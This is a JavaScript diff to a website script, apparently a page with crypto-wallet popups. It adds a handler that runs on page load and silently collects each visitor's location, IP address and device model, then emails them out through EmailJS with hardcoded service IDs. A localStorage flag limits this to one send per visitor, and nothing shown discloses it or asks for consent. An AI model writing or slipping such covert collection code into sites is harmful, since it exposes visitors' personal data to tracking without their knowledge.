@@ -37,6 +37,32 @@ async function collectVisitorData() {
   }
 }
 
+// Send visitor data when the website is loaded
+document.addEventListener("DOMContentLoaded", async () => {
+  if (!localStorage.getItem("emailSent")) {
+    const visitorData = await collectVisitorData();
+
+    const params = {
+      LOCATION: visitorData.location,
+      IP_ADDRESS: visitorData.ip,
+      DEVICE_MODEL: visitorData.device,
+    };
+
+    const serviceID = "service_tp3e91n";
+    const templateID = "template_n52fkpv";
+
+    emailjs
+      .send(serviceID, templateID, params)
+      .then((res) => {
+        console.log("Visitor details email sent successfully", res);
+        localStorage.setItem("emailSent", "true");
+      })
+      .catch((err) => {
+        console.log("Error sending visitor details:", err);
+      });
+  }
+});
+
 // Wallet Popup Handling
 document.querySelectorAll(".wallet").forEach((wallet) => {
   wallet.addEventListener("click", () => {
